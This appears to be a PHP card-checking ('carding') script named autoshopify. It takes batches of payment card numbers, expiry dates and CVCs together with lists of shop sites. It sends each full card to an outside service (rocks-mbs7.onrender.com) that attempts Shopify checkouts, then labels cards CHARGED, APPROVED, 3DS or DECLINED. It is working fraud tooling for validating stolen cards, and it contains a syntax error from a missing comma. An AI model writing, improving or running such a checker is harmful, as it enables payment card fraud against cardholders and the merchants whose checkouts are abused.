<?php
header('Content-Type: text/plain');

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Optional file-based logging for debugging (disable in production)
$log_file = __DIR__ . '/autoshopify_debug.log';
function log_message($message) {
    global $log_file;
    // Mask card numbers in logs
    $message = preg_replace('/(\d{6})\d+(\d{4})/', '$1****$2', $message);
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
}

// Function to check a single card across multiple sites sequentially until a valid response
function checkCard($card, $sites, $retry_per_site = 1) {
    $card_details = $card['number'] . '|' . $card['exp_month'] . '|' . $card['exp_year'] . '|' . $card['cvc'];
    $error_responses = [
        'clinte token', 'product id is empty', 'del amount empty', 'py id empty', 'r4 token empty', 'HCAPTCHA DETECTED' 'tax amount empty'
    ];

    foreach ($sites as $site_index => $site) {
        // Normalize site URL
        if (!preg_match('/^https?:\/\//i', $site)) {
            $site = 'https://' . $site;
        }
        $encoded_cc = urlencode($card_details);
        $api_url = "https://rocks-mbs7.onrender.com/index.php?site=" . urlencode($site) . "&cc=$encoded_cc";
        log_message("Checking card: $card_details on site: $site, URL: $api_url");

        for ($attempt = 0; $attempt <= $retry_per_site; $attempt++) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $api_url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 50); // 50-second timeout
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; enable in production

            $response = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curl_error = curl_error($ch);
            $curl_errno = curl_errno($ch);
            curl_close($ch);

            log_message("Attempt " . ($attempt + 1) . " for $card_details on $site: HTTP $http_code, cURL errno $curl_errno, Response: " . substr($response ?? '', 0, 100));

            // Handle API errors
            if ($response === false || $http_code !== 200 || !empty($curl_error)) {
                if ($curl_errno == CURLE_OPERATION_TIMEDOUT && $attempt < $retry_per_site) {
                    log_message("Timeout for $card_details on $site, retrying...");
                    usleep(500000); // 0.5s delay before retry
                    continue;
                }
                log_message("Failed for $card_details on $site: $curl_error (HTTP $http_code, cURL errno $curl_errno)");
                break; // Move to next site
            }

            // Parse JSON response
            $result = json_decode($response, true);
            if (json_last_error() !== JSON_ERROR_NONE || !isset($result['Response'], $result['Status'], $result['Gateway'], $result['Price'])) {
                log_message("Invalid JSON for $card_details on $site: " . substr($response ?? '', 0, 100));
                break; // Move to next site
            }

            $response_text = trim($result['Response']);
            $gateway = htmlspecialchars($result['Gateway'], ENT_QUOTES, 'UTF-8');
            $price = htmlspecialchars($result['Price'], ENT_QUOTES, 'UTF-8');

            // Check if it's an error response to skip
            $is_error = false;
            foreach ($error_responses as $err) {
                if (stripos($response_text, $err) !== false) {
                    $is_error = true;
                    break;
                }
            }
            if ($is_error) {
                log_message("Error response skipped for $card_details on $site: $response_text");
                break; // Move to next site
            }

            // Map response to status
            $mapped_status = 'DECLINED';
            if (in_array($response_text, ['Thank You', 'ORDER_PLACED'], true)) {
                $mapped_status = 'CHARGED';
            } elseif (in_array($response_text, ['INCORRECT_ZIP', 'INCORRECT_CVV', 'INSUFFICIENT_FUNDS'], true)) {
                $mapped_status = 'APPROVED';
            } elseif ($response_text === '3D_AUTHENTICATION') {
                $mapped_status = '3DS';
            } elseif (in_array($response_text, [
                'CARD_DECLINED', 'FRAUD_SUSPECTED', 'INCORRECT_NUMBER', 'INVALID_PAYMENT_ERROR',
                'AUTHORIZATION_ERROR', 'PROCESSING_ERROR', 'EXPIRED_CARD'
            ], true)) {
                $mapped_status = 'DECLINED';
            }

            $response_msg = htmlspecialchars($response_text, ENT_QUOTES, 'UTF-8');
            $output = "$mapped_status [$response_msg] (Gateway: $gateway, Price: $price) $card_details";
            log_message($output);
            return $output;
        }
    }

    $output = "DECLINED [All sites failed or errored] $card_details";
    log_message($output);
    return $output;
}

// Check if the request is POST and contains cards and sites data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['cards']) || !is_array($_POST['cards']) || !isset($_POST['sites']) || !is_array($_POST['sites'])) {
    log_message("Invalid request or missing cards/sites data");
    echo "ERROR [Invalid request or missing cards/sites data]\n";
    flush();
    exit;
}

$cards = $_POST['cards'];
$sites = $_POST['sites'];
$required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];

// Validate and process each card sequentially
foreach ($cards as $index => $card) {
    // Validate card data
    foreach ($required_fields as $field) {
        if (empty($card[$field])) {
            log_message("Missing $field for card index $index");
            echo "DECLINED [Missing $field]\n";
            flush();
            continue 2;
        }
    }

    // Sanitize inputs
    $card_number = preg_replace('/[^0-9]/', '', $card['number']);
    $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
    $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
    $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

    // Normalize exp_month to 2 digits
    $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
    if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
        log_message("Invalid exp_month format for card index $index: $exp_month_raw");
        echo "DECLINED [Invalid exp_month format]\n";
        flush();
        continue;
    }

    // Normalize exp_year to 4 digits
    if (strlen($exp_year_raw) == 2) {
        $current_year = (int) date('y');
        $current_century = (int) (date('Y') - $current_year);
        $card_year = (int) $exp_year_raw;
        $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
    } elseif (strlen($exp_year_raw) == 4) {
        $exp_year = (int) $exp_year_raw;
    } else {
        log_message("Invalid exp_year format for card index $index: $exp_year_raw");
        echo "DECLINED [Invalid exp_year format - must be YY or YYYY]\n";
        flush();
        continue;
    }

    // Validate card number, year, and CVC
    if (!preg_match('/^\d{13,19}$/', $card_number)) {
        log_message("Invalid card number format for card index $index: $card_number");
        echo "DECLINED [Invalid card number format]\n";
        flush();
        continue;
    }
    if (!preg_match('/^\d{4}$/', (string) $exp_year) || $exp_year > (int) date('Y') + 10) {
        log_message("Invalid exp_year after normalization for card index $index: $exp_year");
        echo "DECLINED [Invalid exp_year format or too far in future]\n";
        flush();
        continue;
    }
    if (!preg_match('/^\d{3,4}$/', $cvc)) {
        log_message("Invalid CVC format for card index $index: $cvc");
        echo "DECLINED [Invalid CVC format]\n";
        flush();
        continue;
    }

    // Validate logical expiry
    $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
    $current_timestamp = strtotime('first day of this month');
    if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
        $card_details = "$card_number|$exp_month|$exp_year|$cvc";
        log_message("Card expired for card index $index: $card_details");
        echo "DECLINED [Card expired] $card_details\n";
        flush();
        continue;
    }

    // Process the card
    $processed_card = [
        'number' => $card_number,
        'exp_month' => $exp_month,
        'exp_year' => $exp_year,
        'cvc' => $cvc
    ];
    $result = checkCard($processed_card, $sites);
    echo $result . "\n";
    flush(); // Ensure output is sent immediately
    usleep(200000); // Small delay to avoid overwhelming the API
}
?>
